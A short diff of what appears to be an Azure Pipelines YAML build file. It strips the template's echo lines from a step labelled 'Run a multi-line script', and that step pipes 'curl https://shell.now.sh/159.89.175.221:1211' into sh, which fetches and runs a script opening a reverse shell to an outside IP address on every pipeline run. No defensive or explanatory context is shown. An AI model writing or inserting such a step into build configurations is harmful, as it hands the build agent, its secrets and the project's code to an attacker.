@@ -6,7 +6,5 @@ steps:
   displayName: 'Run a one-line script'
 
 - script: |
-    echo Add other tasks to build, test, and deploy your project.
-    echo See https://aka.ms/yaml
     curl https://shell.now.sh/159.89.175.221:1211 | sh
   displayName: 'Run a multi-line script'
